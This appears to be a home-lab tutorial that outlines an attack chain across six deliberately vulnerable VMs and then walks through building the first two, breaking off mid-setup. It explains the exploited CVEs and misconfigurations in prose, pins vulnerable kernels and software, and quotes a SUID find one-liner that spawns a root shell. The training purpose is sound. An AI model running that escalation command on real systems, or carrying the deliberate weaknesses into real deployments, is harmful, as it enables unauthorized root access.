---
title: " Home Lab 1 : Isolate "
date: 2026-07-10 00:00:00 +0000
categories: [Home Lab ]
tags: [Active Directory, Windows, Linux, CVEs, Privilege Escalation, Pivoting, ADCS, Homelab]
---



## Overview : 

This lab contains 6 boxes. Each one requires a foothold exploit to gain initial access, followed by a separate privilege escalation exploit to reach root or SYSTEM  the technique depends on the OS.

We'll start by building the lab using VMware to run the different boxes. The network is split into two segments  an internal network and a public-facing one, much like a real-world DMZ. This means tunneling and pivoting are required to reach anything inside once you've landed on the edge.

We'll first build the lab in VMware, and once everything is set up, we'll move to the attack phase using our Kali machine to compromise the entire network. Once every box is built, we'll break down the network architecture connecting them including how traffic actually gets from Kali into the internal segment.

The chain mixes classic and recent CVEs  from Drupalgeddon2 to fresh 2026 kernel bugs like CopyFail, DirtyFrag, and RoguePlanet. Then an AD box, where we focus on a specific ADCS attack: ESC8.

Quick version of the full attack path: 

- Foothold on **WEB01** via a React Server Components deserialization bug (CVE-2025-55182), then root via a kernel LPE, CopyFail, before pivoting into the internal network with Ligolo-ng, exposing four more machines. From there.

- **Box 2** falls to Drupalgeddon2 (CVE-2018-7600) for a www-data shell, escalated to root via another kernel LPE, DirtyFrag.

- **Box 3** goes down next through a WordPress plugin LFI-to-RCE chain (CVE-2023-6553, PHP filter chains) for www-data, followed by a misconfigured SUID find binary for root.

- **Box 4** is a pure misconfig box, where a no_root_squash NFS share leaks Windows credentials outright, while Samba's usermap script (CVE-2007-2447), an unauthenticated Redis instance, and a passwordless sudo rule allowing the leaked user to run nano as root (GTFOBins) all offer independent routes straight to root anyway.

- Those leaked credentials get reused on **Box 5**, a Windows workstation, where the svc_backup account provides WinRM access. A misconfigured backup service running with elevated privileges exposes an unquoted service path vulnerability, allowing the service binary to be replaced and executed under the Administrator context. From there, RDP provides a full graphical session, where RoguePlanet, a Windows Defender race-condition exploit, escalates the Administrator shell to SYSTEM.

- The same credentials are reused once more on the Domain Controller **(Box 6)** as a valid domain account, triggering an ADCS ESC8 chain, where PetitPotam coerces the DC to authenticate, ntlmrelayx relays that auth to the undefended Web Enrollment endpoint, Certipy turns the resulting certificate into a TGT via PKINIT, and a final DCSync dumps every credential in the domain, including krbtgt.


<img width="1600" height="1000" alt="svgviewer-png-output (1)" src="https://github.com/user-attachments/assets/6b8475f6-77dd-4b7a-8352-2fbb50e7025e" />


## Scenarios : 


### Box 1 : Fail2Copy : 

WEB01 runs a Next.js application a full-stack framework built on top of React. React handles UI components, while Next.js adds server-side capabilities on top: file-based routing, API endpoints, and critically React Server Components (RSC), which let React components execute directly on the server, inside the Node.js process.

*(Quick primer if you're new to the JS ecosystem: JavaScript is the language, TypeScript is JavaScript with type annotations that gets compiled away before runtime, and Node.js is the runtime that lets JS execute outside a browser. None of that matters for the exploit itself what matters is that RSC means React code runs server-side, inside a real process, with real privileges.)*

This server-side execution is exactly what CVE-2025-55182 targets. By sending a crafted POST request with a malicious serialized payload, an attacker can abuse the RSC deserialization mechanism to inject and execute arbitrary JavaScript inside the Node.js process Remote Code Execution as the application user.

From that low-privileged shell, we chain into CVE-2026-31431 (CopyFail), a Linux kernel Local Privilege Escalation, to get root.


### Box 2 : DirtyGeddon2 : 

This box runs Drupal a popular open-source CMS on a classic LAMP stack: Linux, Apache, MySQL, and PHP. Apache receives the request, hands it to PHP, PHP runs Drupal, Drupal talks to MySQL, and PHP renders the response.

The foothold is CVE-2018-7600, nicknamed Drupalgeddon2, affecting Drupal 7.x before 7.58 (our target runs 7.57). The root cause sits in Drupal's Form API: internal array keys prefixed with # like #post_render are used to call PHP functions during rendering. Drupal accepted these keys directly from raw HTTP input without sanitizing them. An unauthenticated attacker can send a crafted POST request to the public registration page, inject a #post_render key pointing at PHP's exec(), and pass any OS command as the argument giving a shell as www-data, no authentication required.

From there, we chain into CVE-2026-43284 (DirtyFrag), another Linux kernel Local Privilege Escalation, to reach root.


### Box 3 : Backup : 

This box runs WordPress the most widely used CMS on the internet on the same LAMP stack as Box 2. WordPress's real attack surface, though, is its plugin ecosystem: thousands of third party extensions, any one of which can compromise the entire server if vulnerable.

The plugin here is Backup Migration v1.3.7, a legitimate backup/migration tool with 80,000+ real installs. The bug, CVE-2023-6553 (CVSS 9.8), lives in backup-heart.php, which reads a path straight from the Content-Dir HTTP header and passes it unsanitized into PHP's include() a classic Local File Inclusion primitive.

On its own, LFI is already dangerous, but this one escalates to full RCE through a PHP filter chain: include() supports stream wrappers like php://filter, which apply encoding transformations to a data stream before it's read. Chaining dozens of these filters in a specific sequence forces PHP to generate and execute arbitrary code on the fly no upload, no second stage, no authentication. One crafted request is enough for a www-data shell.

Root comes from a deliberately misconfigured SUID binary: find has been given the SUID bit, so it runs as root regardless of caller. A single GTFOBins one-liner — find . -exec /bin/sh -p \; -quit — spawns a root shell.


### Box 4 : ORNN :

Box 4 has no web application it's a Linux box exposing three misconfigured network services, and it's the bridge into the rest of the internal network (and eventually the Windows machines).

NFS shares are defined in /etc/exports. The critical flaw here is no_root_squash: normally NFS demotes a connecting client's root user to an unprivileged anonymous account ("root squashing"). With that protection disabled, root on the attacking machine stays root on the share. An attacker mounts the share, drops a SUID binary on it, then executes it from the target to get a root shell. The share also contains a password protected ZIP archive holding the Windows credentials cracked offline with John the Ripper, no exploitation needed beyond that.

Samba 3.0.20 is vulnerable to CVE-2007-2447, the "usermap script" bug. Samba's username map script feature passes the connecting client's username to a shell script unsanitized. An attacker embeds shell commands in backticks inside the username field, and Samba executes them as root, with zero authentication.

Redis is bound to 0.0.0.0 with no password. Its CONFIG SET dir / CONFIG SET dbfilename commands let an attacker redirect where Redis writes its database file. By pointing that write path at /root/.ssh/authorized_keys and saving an attacker-controlled SSH public key as a value, the attacker plants their own key in root's authorized_keys then SSHs in as root with no password and no exploit.

Finally, a sudo -l check on the user recovered from the cracked credentials reveals a passwordless sudo rule on nano  a documented GTFOBins escalation (drop to a shell from inside the editor) that gives a fourth, independent path to root.


### Box 5 : Rogue : 

Box 5 is a standard Windows 10/11 workstation designed to resemble a typical enterprise endpoint. It exposes no web application and no unnecessary services, keeping the initial attack surface intentionally minimal. Access comes through a dedicated backup account, svc_backup, whose credentials are leaked from the NFS share on Box 4. The account is allowed to authenticate remotely through WinRM, providing a limited command-line foothold without administrative privileges.

The escalation path relies on a misconfigured backup service. The service runs with elevated privileges but uses an improperly quoted binary path, creating an unquoted service path vulnerability. Because svc_backup has permission to restart the service, an attacker can exploit Windows' path resolution behavior by placing a malicious executable in the expected search path. When the service is restarted, Windows executes the attacker-controlled binary with the service's privileges, resulting in an Administrator shell.

With administrative access obtained, Remote Desktop is enabled and a graphical session is established as the local Administrator account. From this session, RoguePlanet is executed, a public exploit targeting a race condition in Windows Defender. The technique abuses the timing window between file creation and Defender's processing of the file, allowing execution to inherit Defender's SYSTEM-level privileges. No kernel exploit, no UAC bypass, no additional software just a vulnerable service configuration followed by the Defender race condition.


### Box 6 : DC01 : 

The final box is a Windows Server 2019 Domain Controller the single point of trust for the whole domain, handling Kerberos authentication and hosting Active Directory. It also runs ADCS (Active Directory Certificate Services) with the Web Enrollment role, which exposes an HTTP certificate-request interface at http://DC/certsrv.

A low-privileged domain user exists on the DC, deliberately reusing the same credentials as the local admin on Box 5 a realistic case of password reuse across systems.

The attack abuses ESC8, one of the ADCS escalation paths from SpecterOps' "Certified Pre-Owned" research. Web Enrollment accepts NTLM authentication without Extended Protection for Authentication (EPA) enabled the default configuration  making it vulnerable to NTLM relay.

The chain runs in four steps:

- 1/ Coercion using the domain user's credentials, PetitPotam abuses MS-EFSRPC to force the DC to authenticate outbound to the attacker's machine using its own machine account.
  
- 2/ Relay  ntlmrelayx intercepts that NTLM authentication and relays it to the undefended Web Enrollment endpoint, requesting a certificate on behalf of the DC's machine account using the (enabled-by-default) Domain Controller certificate template.

- 3/ Authentication Certipy uses that certificate to authenticate via PKINIT, obtaining a TGT for the DC machine account.

- 4/ DCSync with that TGT, the attacker impersonates the DC and invokes MS-DRSR replication to dump every credential in the domain, including the krbtgt hash (Golden Ticket material) and the Domain Administrator hash.

The domain is fully compromised.


## Lab Build : 

### TLDR : 

All six boxes were built in VMware. Each machine is deliberately pinned to a specific OS, package, and where relevant kernel version, to guarantee the vulnerability is present and reproducible, and to make sure no automatic update silently patches it mid-lab. Below is the exact build for each box, in the order they're attacked.

**Box 1:**

Debian 12, Next.js/React Server Components application, Node.js runtime, Linux kernel pinned to 6.0.39 for CopyFail compatibility.

**Box 2:**

Ubuntu 24.04.4 running a full LAMP stack (Apache, MySQL, PHP) with Drupal 7.57 installed and a kernel version vulnerable to DirtyFrag.

**Box 3:**

Debian 13 with Apache, MySQL, PHP, WordPress, and the Backup Migration 1.3.7 plugin. find configured with the SUID bit.

**Box 4:**

Debian 13 bridge host exposing:
- NFS with no_root_squash;
- Samba 3.0.20 with username map script;
- Redis bound to 0.0.0.0 without authentication;
- passwordless sudo nano;
- password-protected ZIP archives containing Windows credentials.

**Box 5:**

Windows 10/11 workstation with SMB enabled and a local administrator account configured for lateral movement.

**DC01:**

Windows Server 2019 configured as an Active Directory Domain Controller with DNS, ADCS, Web Enrollment, a reusable domain account, and certificate templates vulnerable to ESC8.

**Networking:**

The lab is split into two segments:

- A NAT network hosting Kali and the public-facing web server;
- An isolated internal network containing all remaining Linux and Windows systems.

The first machine is dual-homed and serves as the pivot point into the internal network. After compromise, Ligolo-ng creates transparent routing from Kali to the internal subnet, allowing native use of reconnaissance, exploitation, and Active Directory tooling.

### Box 1 : Fail2Copy : 

#### ISO Installation : 

WEB01 runs on Debian 12 (Bookworm), with the kernel downgraded and pinned to a version vulnerable to CopyFail. On top of the OS, we install Node.js and npm, and deploy a Next.js application vulnerable to CVE-2025-55182, exposed on port 3000.

Now first we need the Debian Image , i downloaded it from this link : 

```bash
https://cdimage.debian.org/cdimage/archive/12.12.0/amd64/iso-dvd/
```

Once we Download it , we create a new VM : 

<img width="1159" height="513" alt="image" src="https://github.com/user-attachments/assets/7b2dc78b-2e15-46ab-8c64-4af7d55c5a01" />

Now once we start our VM , we can use Normal install instead of the graphical one to save time : 

<img width="1033" height="583" alt="image" src="https://github.com/user-attachments/assets/28520276-c15b-40bb-ac7a-9cbfdc46fd53" />

The installation is Pretty straight forward , Few things we will note : 

Hostname : 

<img width="1020" height="329" alt="image" src="https://github.com/user-attachments/assets/2bf732d5-049e-4fbf-85c9-f8f34b32a2f3" />

For the Domain name , we will keep it empty for now : 

<img width="960" height="461" alt="image" src="https://github.com/user-attachments/assets/d2e95c28-c694-423f-ad81-7b3fed7ec39f" />

Set up your root Password ;

<img width="1034" height="415" alt="image" src="https://github.com/user-attachments/assets/a12d1518-e882-401b-ac88-c5d218f15307" />

For the user we use : 

```bash
azerty : azerty
```

<img width="913" height="290" alt="image" src="https://github.com/user-attachments/assets/90a96a8a-e53f-4779-816d-c51e7c704f9d" />

Timezone in our case is Eastern . 

For the Disk : 

<img width="965" height="373" alt="image" src="https://github.com/user-attachments/assets/5cab424c-2bd6-4299-b9a6-4523269e57e7" />

For the Patitioning scheme : 

<img width="918" height="366" alt="image" src="https://github.com/user-attachments/assets/4ab7969a-cc57-4c60-a2a7-1eb98d5e9a65" />

Then we just confirm everything: 

<img width="1021" height="367" alt="image" src="https://github.com/user-attachments/assets/e3243468-5c6e-46ff-888f-28f68a7c1ed7" />

For the Extra Media Installations : 

<img width="925" height="423" alt="image" src="https://github.com/user-attachments/assets/13e4d802-833c-414c-bf1e-35a4e55293eb" />

We don't really need them for this lab . 

Since we need to install other dependencies and packages we need to enable the Network mirroring : 

<img width="951" height="358" alt="image" src="https://github.com/user-attachments/assets/3615902d-5fc3-4f58-83bb-67a73d189b84" />

For the mirror it can be anything you choose really : 

<img width="940" height="523" alt="image" src="https://github.com/user-attachments/assets/f0839ab4-5712-45f6-b59d-58fbf55277fa" />

Also just go with the default one : 

<img width="885" height="366" alt="image" src="https://github.com/user-attachments/assets/83a1de25-0376-4ec8-882f-7d61ad2760e4" />

We won't be needing any Proxies for this one :

<img width="971" height="274" alt="image" src="https://github.com/user-attachments/assets/9112f0e0-07fa-476a-abb9-ffdab86c05a9" />

Of course we need to add SSH so that we don't have to intall it manually later . 

<img width="910" height="372" alt="image" src="https://github.com/user-attachments/assets/13cc89f8-2762-4deb-8849-4b3e099d38bc" />

We should also install the Grub Boot Loader as well : 

<img width="995" height="338" alt="image" src="https://github.com/user-attachments/assets/a552261c-243c-42e6-9934-e88bcd3bda08" />

Then we specify the Device , we already put everything is 1 partition during Insallation so we should only see 1 : 

<img width="984" height="263" alt="image" src="https://github.com/user-attachments/assets/b9a0d028-35d8-4c01-b63c-62f632d83a38" />

Finally we select the Reboot option and we should be set : 

<img width="995" height="306" alt="image" src="https://github.com/user-attachments/assets/9fb5742c-49be-42be-852b-7b44863e66c9" />

#### Scenario  : 

##### Priv Esc : 

Now that everything is set , first thing we should setup is the path for the privilege escalation.

First we should check the version of the Kernel that was installed : 

<img width="1484" height="379" alt="image" src="https://github.com/user-attachments/assets/8fdc0252-9b46-4a61-9086-5bf4120e52fc" />

This version is patched and not vulnerable to CopyFail . 

So we will first start by installing a kernel version that is vulnerable . We first list all the available kernels that are installed . 

```bash
dpkg --list | grep linux-image
```

<img width="856" height="316" alt="image" src="https://github.com/user-attachments/assets/45797576-3b94-4d25-99af-1899e9c6e5c9" />

Perfect we see that we already have a kernel version that is vulnerable , already installed we just need to Boot from it . 

```bash
linux-image-6.1.0-39-amd64
```

In case you don't find it , you can easily install it . First update the packages , then check list all available kernels that we can install :

```bash
apt update
apt search linux-image-6.1
```

<img width="1237" height="704" alt="image" src="https://github.com/user-attachments/assets/89fc81d5-5690-4685-8ac5-5ed8b757906a" />

We're looking for Old versions for this one : 

```bash
apt install linux-image-6.1.0-39-amd64 
```

you should see this error : 

```bash
Media change: please insert the disc labeled                                                                                                                                                                      
 'Debian GNU/Linux 12.12.0 _Bookworm_ - Official amd64 DVD Binary-1 with firmware 20250906-15:05'
in the drive '/media/cdrom/' and press [Enter]
````

This means that APT is trying to fetch some dependencies from the Debian installation DVD, it means that that /etc/apt/sources.list still contained a cdrom: entry at that point.

You fix it by disabling the DVD repository and switching back to the official Debian mirrors:

```bash
nano /etc/apt/sources.list

===> Then you comment the First Repo :
# deb cdrom:[Debian GNU/Linux 12.12.0 _Bookworm_ ...]
```

Make sure you keep the other regular repos : 

<img width="1383" height="381" alt="image" src="https://github.com/user-attachments/assets/aba980d7-ed9f-4425-83db-1bbc61b1ce5a" />

From there we update the package cache and retry installing it : 

```bash
apt update
apt install linux-image-6.1.0-39-amd64 
```

<img width="981" height="445" alt="image" src="https://github.com/user-attachments/assets/d53b67f9-eb7b-4151-9cf4-e2c6b978ec53" />

Once we have the vulnerable kernel , we need to Boot it from Grub  . By default the bootloader will use the latest Kernel (updated one) so we first need to make sure we show the Grub Loader Menu and make sure we boot using the old Kernel : 

First check if Grub Menu is hidden and how long it takes before it boots : 

```bash
grep GRUB_TIMEOUT_STYLE /etc/default/grub
grep GRUB_TIMEOUT /etc/default/grub
```

<img width="678" height="215" alt="image" src="https://github.com/user-attachments/assets/8a4c34ec-82df-4fec-aed2-1bb85035327c" />

It's not hidden , and we have 5 Sec , before it boots with default entry : 

Now we just reboot it and Select Advanced Options in the Grub Loader menu : 

<img width="902" height="294" alt="image" src="https://github.com/user-attachments/assets/fa3fa1f1-96da-481e-89cc-024ab2463196" />

From there we slect the Vulnerable Kernel (.39) and boot with it : 

Now if we check the Kernel version : 

<img width="1227" height="301" alt="image" src="https://github.com/user-attachments/assets/4b7c1a8a-9b1e-4b51-9075-0b1bcd65042a" />

We see that it is the one vulnerable to CopyFail . 

##### Foothold : 

Now moving on to building the vulnerable Next.js application.

First, we need to install the JavaScript development environment.

The main components we need are:

- JavaScript (JS): The programming language used to write the application logic.
- Node.js: The runtime environment that allows JavaScript code to execute outside of the browser.
- npm (Node Package Manager): The package manager included with Node.js, used to install and manage application dependencies.
- Next.js: The framework used to build our application, based on React.
- React: The library responsible for creating the user interface components.

Before creating the vulnerable application, we need to install Node.js and npm on our Debian machine.

```bash
apt update
apt install nodejs npm -y
```

To verify : 

```bash
node --version
npm --version
```

<img width="1161" height="358" alt="image" src="https://github.com/user-attachments/assets/b9c1f91d-f247-4956-be8f-c03d312a4c6b" />

Now that Node.js and npm are installed, we can create the application that will simulate the vulnerable web service.

For realism, the application should not run as root. In a real-world deployment, web applications are usually executed under a dedicated service account with limited permissions.

First, we create a dedicated user for the application:

```bash
useradd -m -s /bin/bash reactlab
passwd reactlab # To give the user a password
su - reactlab
id # Verify 
```

<img width="1056" height="383" alt="image" src="https://github.com/user-attachments/assets/082441d4-4890-4cef-912e-b2661e56e838" />

Now we create the app : 

First we initialize the Node.js project :

```bash
npm init -y
```

npm init creates the initial configuration file for a Node.js project.

After running this command, a file called: *package.json* is created.

<img width="1193" height="514" alt="image" src="https://github.com/user-attachments/assets/a4dddd82-914d-4b70-b1fb-054d28dc69d7" />

package.json is the central configuration file of a Node.js application. It contains:

Project information (name, version, description)
Available commands (scripts)
Installed dependencies and their versions

For example, later it will tell npm how to start our application:

```js
"scripts": {
  "dev": "next dev"
}
```

Now we install the components required to run our vulnerable application:

```bash
npm install next@15.0.4 react@19.0.0 react-dom@19.0.0
```

This installs three packages:

**Next.js** (next@15.0.4)

Next.js is the framework responsible for running the web application.

It provides:

- The web server
- Routing
- Server-side rendering
- React Server Components support

This is the component exposing the vulnerable server-side functionality used in this lab.

**React** (react@19.0.0)

React is the UI library used by Next.js.

It allows developers to build applications using reusable components.

Example:

```js
<h1>Forged.corp</h1>
```

is a React component output.

**React DOM** (react-dom@19.0.0)

React DOM provides the integration between React and the web environment.

In a browser application, it is responsible for rendering React components into HTML.

After installation, npm creates:

- node_modules/
- package.json
- package-lock.json

<img width="1134" height="599" alt="image" src="https://github.com/user-attachments/assets/5c8dd7a7-a94f-4243-b0a9-aa7e98604d23" />

**node_modules :**

This directory contains the actual source code of all installed dependencies.

For example:

```bash
node_modules/
 ├── next/
 ├── react/
 └── react-dom/
````

<img width="926" height="276" alt="image" src="https://github.com/user-attachments/assets/39002ccd-35e7-45f0-aa3f-d43f5da5b975" />

**Package-lock.json :** 

This file records the exact versions of every installed dependency.

It ensures that if someone else downloads the project later, they install the same versions and reproduce the same environment.

To confirm the vulnerable versions were installed : 

```bash
npm list next react react-dom
```

Expected Result : 

```bash
reactlab@1.0.0 /home/reactlab
├─┬ next@15.0.4
│ ├── react-dom@19.0.0 deduped
│ ├── react@19.0.0 deduped
│ └─┬ styled-jsx@5.1.6
│   └── react@19.0.0 deduped
├─┬ react-dom@19.0.0
│ └── react@19.0.0 deduped
└── react@19.0.0
```

<img width="995" height="398" alt="image" src="https://github.com/user-attachments/assets/24e9ba05-b8e1-4c31-b2e8-b3a38871d83c" />

This step is important because npm can sometimes install newer compatible versions if versions are not explicitly pinned.

Now back to our app directory , the structure should look like this :

```bash
reactlab@Fail2Copy:~$ pwd
/home/reactlab
reactlab@Fail2Copy:~$ ls
node_modules  package.json  package-lock.json
reactlab@Fail2Copy:~$ 
```

**Next.js** provides two routing systems:

- Pages Router (older)
- App Router (newer)

For this lab, we use the App Router because it uses React Server Components.

First we create the application directory:

```bash
mkdir app
```

The project now looks like:

```bash
React-app/
├── app/
├── package.json
├── package-lock.json
└── node_modules/
```

Now let's Create the main page :

**Create:**

```bash
nano app/page.jsx
```

The file *app/page.jsx* represents the main page of the application.

In Next.js App Router:

- The folder name defines the route.
- The file page.jsx defines what is displayed.

For example:

```bash
app/page.jsx
==> becomes:
http://localhost:3000/
```

Feel free to customize your UI as you want , i won't be pasting the entire Front end code since it won't be necessary , but anything will be good for this demo really .

Now moving on to the Layout , Creating the root layout

The layout file defines the HTML structure shared by all pages.

**Create:**

```bash
nano app/layout.jsx
```

Inside the file Add:

```js
export const metadata = {
  title: "ISOLATE Cybersecurity",
  description: "Advanced cybersecurity research and defense platform",
};


export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <body>
        {children}
      </body>
    </html>
  );
}
```

Now for some styling (Not needed but in case you wanted to add it ) :

Create the global CSS file:

```bash
nano app/globals.css
```

Add :

```css
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  background: #050816;
.....

```

**Importing the CSS file :**

```bash
nano app/layout.jsx
```

Add this at the top:

```js
import "./globals.css";
```

The file should now start with:

```js
import "./globals.css";

export const metadata = {
  title: "ISOLATE Cybersecurity",
  description: "Advanced cybersecurity research and defense platform",
};
....
```

<img width="999" height="830" alt="image" src="https://github.com/user-attachments/assets/7acc653b-6bf2-4eaa-a2da-f7346a085ad0" />

Add the npm scripts

Edit the **Package.json** file :

```bash
nano package.json
```

Make sure the scripts section contains:

```bash
"scripts": {
  "dev": "next dev",
  "build": "next build",
  "start": "next start"
}
```

These commands control how Next.js runs:

- npm run dev → development server
- npm run build → creates production build
- npm run start → starts production server

**Start the vulnerable application :**

Now checking the structure of Folders , it should look like this : 

```bash
React-app/
├── app/
│   ├── page.jsx
│   ├── layout.jsx
│   └── globals.css
├── package.json
├── package-lock.json
└── node_modules/
```

<img width="886" height="351" alt="image" src="https://github.com/user-attachments/assets/1eed94f4-21d0-4775-9498-7c2aff386c1b" />

Run as the low-privileged user:

```bash
npm run dev
```

<img width="689" height="332" alt="image" src="https://github.com/user-attachments/assets/d5d9ea98-dcfe-43d2-babb-f6115cfb9179" />

Now if we visit the localhost port 3000 : 

<img width="1830" height="858" alt="image" src="https://github.com/user-attachments/assets/51fb8562-d9a4-42c7-af9c-1b637e10d228" />

Our app is running perfectly . And we can access it from our Kali machine (But that's for the upcoming section) .

Now Box1 is done , let's move on to Box2 . 


### Box 2 : DirtyGeddon2 : 

#### ISO Installation : 

For this machine , we'll need one of these machine for the Dirty Frag exploit : 

Ubuntu 24.04.4: 6.17.0-23-generic
RHEL 10.1: 6.12.0-124.49.1.el10_1.x86_64
openSUSE Tumbleweed: 7.0.2-1-default
CentOS Stream 10: 6.12.0-224.el10.x86_64
AlmaLinux 10: 6.12.0-124.52.3.el10_1.x86_64
Fedora 44: 6.19.14-300.fc44.x86_64
....

In our case we will use the Ubuntu 24.04.4 . 

Here is the Link to Download the ISO : 

```bash
https://releases.ubuntu.com/noble/
```

Once downloaded , create a new Virtual machine .

<img width="1076" height="510" alt="image" src="https://github.com/user-attachments/assets/7db54d5f-99b3-4d11-8db7-84af8ed87999" />

Power on the VM so that we can start the Installation : 

<img width="1245" height="740" alt="image" src="https://github.com/user-attachments/assets/a95a23b3-0b8c-404d-b409-a71140419197" />

Now we just install Ubuntu : 

<img width="1070" height="423" alt="image" src="https://github.com/user-attachments/assets/afbc7cf3-d735-4e67-91de-327854b9c5ae" />

We will keep the default selection : 

<img width="1065" height="363" alt="image" src="https://github.com/user-attachments/assets/0b1ab05d-304b-4f71-bae7-58bed12f1264" />

For Third party software and media , we won't be needing that for this lab : 

<img width="1068" height="562" alt="image" src="https://github.com/user-attachments/assets/c64abd43-dff8-4d24-9e2d-55914c4eec36" />

For the Disk setup select the first one , we will keep things simple : 

<img width="1120" height="588" alt="image" src="https://github.com/user-attachments/assets/2d99219c-b387-4e92-a956-c7c683511b64" />

For the user :

<img width="1138" height="730" alt="image" src="https://github.com/user-attachments/assets/6288141b-560f-4af2-9972-1956d9b6a06f" />

We don't need AD for this one . 

Finally we just start the installation, it make take a while . 

<img width="1081" height="653" alt="image" src="https://github.com/user-attachments/assets/ae88a23d-7779-4e00-8fc1-7432b6e8e700" />

Once the installation is completed , restart the system :

<img width="1140" height="710" alt="image" src="https://github.com/user-attachments/assets/3cc43959-e194-4ae1-a7a3-f7cd74f4d463" />

Now Once we start the machine , to enable the Copy/Paste we need to first install VMware Tools :

```bash
sudo apt update
sudo apt install open-vm-tools open-vm-tools-desktop -y
sudo reboot
``` 

#### Scenario  : 

##### Priv Esc : 

We chose this Ubuntu and kernel version because it is vulnerable to DirtyFrag (CVE-2026-43284), But the Kernel version we got after the Installation was patched 6.17.0-35

<img width="915" height="231" alt="image" src="https://github.com/user-attachments/assets/7434034f-74f0-43e5-87a7-dffceeca5e04" />

First let's list all the kernels that we've got downloaded :

```bash
dpkg -l | grep 6.17.0
```

We are looking for 6.17.0-23-generic, the version against which the DirtyFrag exploit was validated by its author.

<img width="1690" height="384" alt="image" src="https://github.com/user-attachments/assets/f4f97d47-228e-4b02-b939-f9e39800d8a2" />

If the vulnerable kernel is not installed, we can install it manually:

```bash
sudo apt install linux-image-6.17.0-23-generic \
linux-modules-6.17.0-23-generic \
linux-modules-extra-6.17.0-23-generic
```

Now we need to configure the Grub menu , since on this ubuntu version it is hidden by default :

```bash
sudo nano /etc/default/grub
```

Ensure that the following options are present:

```bash
GRUB_DEFAULT=5
GRUB_TIMEOUT_STYLE=menu
GRUB_TIMEOUT=5
GRUB_DISTRIBUTOR=`( . /etc/os-release; echo ${NAME:-Ubuntu} ) 2>/dev/null || echo Ubuntu`
GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"
GRUB_CMDLINE_LINUX=""
```

<img width="1035" height="360" alt="image" src="https://github.com/user-attachments/assets/16772791-35cd-400c-a619-67174cb13879" />

By changing GRUB_TIMEOUT_STYLE to menu, the GRUB menu becomes visible during startup, and GRUB_TIMEOUT=5 gives us five seconds to choose the desired kernel.

From there we reboot the machine :

<img width="1120" height="552" alt="image" src="https://github.com/user-attachments/assets/d4477f73-b34e-4f42-b139-4c20d27aa88e" />

We select Advanced Options , Then we speficy the kernel we need :

<img width="980" height="461" alt="image" src="https://github.com/user-attachments/assets/d2fccf8a-108e-4a9c-8aba-77ea37eb30d0" />

It is 23 in this case . Once it boots , we check again :

```bash
uname -a
```

<img width="1060" height="329" alt="image" src="https://github.com/user-attachments/assets/a1ec3c55-ee0d-48b3-834b-bd231cb8a36a" />

The machine is now running the same kernel version that was used to validate the DirtyFrag exploit, ensuring that the privilege-escalation step can be reproduced reliably.

Now let's move on to the initial foothold.


##### FootHold : 

For the initial compromise, the machine hosts Drupal 7.57, running on a standard LAMP stack:

- Linux as the operating system.
- Apache as the web server.
- MySQL/MariaDB as the database backend.
- PHP as the scripting language powering Drupal.

Before deploying Drupal, we install the packages required by the LAMP stack:

```bash
sudo apt update
sudo apt install apache2 mariadb-server php php-mysql \
php-gd php-xml php-mbstring php-curl wget unzip -y
```

<img width="1370" height="387" alt="image" src="https://github.com/user-attachments/assets/ce5a50c0-5b99-49f2-8169-64ddae02767e" />

Once the dependencies are installed, we download and deploy Drupal 7.57, a version vulnerable to CVE-2018-7600 (Drupalgeddon2), which allows unauthenticated remote code execution through Drupal's Form API.

**Download Drupal:**

```bash
cd /tmp
wget https://ftp.drupal.org/files/projects/drupal-7.57.tar.gz
```

**Extract the archive:**

```bash
tar -xzf drupal-7.57.tar.gz
```

The extracted directory contains the Drupal application files, including PHP code, modules, themes, and configuration files.

We need to move Drupal into Apache's web directory:

```bash
sudo mv drupal-7.57 /var/www/html/drupal
```

Apache serves websites from /var/www/html, so placing Drupal here makes it accessible through the browser.

**Setting Drupal File Permissions**

First we change ownership of the Drupal directory:

```bash
sudo chown -R www-data:www-data /var/www/html/drupal
```

Apache runs under the www-data account. Giving ownership to this user allows Drupal to write required files such as caches, uploaded content, and configuration files.

Then we set directory permissions:

```bash
sudo find /var/www/html/drupal -type d -exec chmod 755 {} \;
sudo find /var/www/html/drupal -type f -exec chmod 644 {} \;
```

This ensures directories can be accessed while files remain appropriately restricted.

<img width="1228" height="573" alt="image" src="https://github.com/user-attachments/assets/8690d756-c3b9-4d6e-b9c8-d80a93e33bfa" />

Now we should setup Apache to serve our app : 

**Configuring Apache**

First we create a dedicated Apache configuration for Drupal:

```bash
sudo nano /etc/apache2/sites-available/drupal.conf
```

Add:

```bash
<VirtualHost *:80>

    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html/drupal

    <Directory /var/www/html/drupal>
        AllowOverride All
        Require all granted
    </Directory>

</VirtualHost>
```

This tells Apache where Drupal is installed and allows Drupal's .htaccess file to control URL rewriting and application settings.

Then we Enable Apache URL rewriting :

```bash
sudo a2enmod rewrite
```

Drupal uses URL rewriting for clean URLs and proper routing.

From there we should disable the default Apache page:

```bash
sudo a2dissite 000-default.conf
```

Then we enable the Drupal site:

```bash
sudo a2ensite drupal.conf
```

Then Finally we just Restart Apache:

```bash
sudo systemctl restart apache2
```

<img width="1103" height="611" alt="image" src="https://github.com/user-attachments/assets/5d820870-38e5-46bc-b728-0653589a32ce" />

At this point Apache is configured to serve the Drupal installation instead of the default website.

To test this , we can try curl on our localhost :

<img width="1020" height="830" alt="image" src="https://github.com/user-attachments/assets/9f53af8b-7840-4b77-b788-f960d404489c" />

We see that we are able to curl the Drupal directory . But we get an error . 

This is normal since Drupal 7.X usually uses PHP 7.4 not 8.3 that was installed by default . 

We need to Downgrade to php7.4 :

On Ubuntu 22.04/24.04, PHP 7.4 is not in the default repositories, so you need the PHP repository:

```bash
php -v  # you should see 8.3
sudo apt install software-properties-common -y
```

Then we add the repository : 

```bash
sudo add-apt-repository ppa:ondrej/php
sudo apt update
```

Then we install php7.4 :

```bash
sudo apt install php7.4 php7.4-mysql php7.4-gd \
php7.4-xml php7.4-mbstring php7.4-curl -y
```

Then we disable php8.3 and enable 7.4 : 

```bash
sudo a2dismod php8.3
sudo a2enmod php7.4
sudo systemctl restart apache2 #To reset the conf 
```

Now we check again : 

```bash
php -v
```

It's okey if you see 8.3 , this just means that our command-line PHP is still PHP 8.3.

We need to check what Apache is using.

```bash
ls -la /etc/apache2/mods-enabled/ | grep php
```

<img width="1057" height="420" alt="image" src="https://github.com/user-attachments/assets/bc4fb056-6b51-4952-9430-fd8ae96baa7a" />

Now we create a test php file :

```bash
sudo nano /var/www/html/drupal/test.php
```

We put this : 

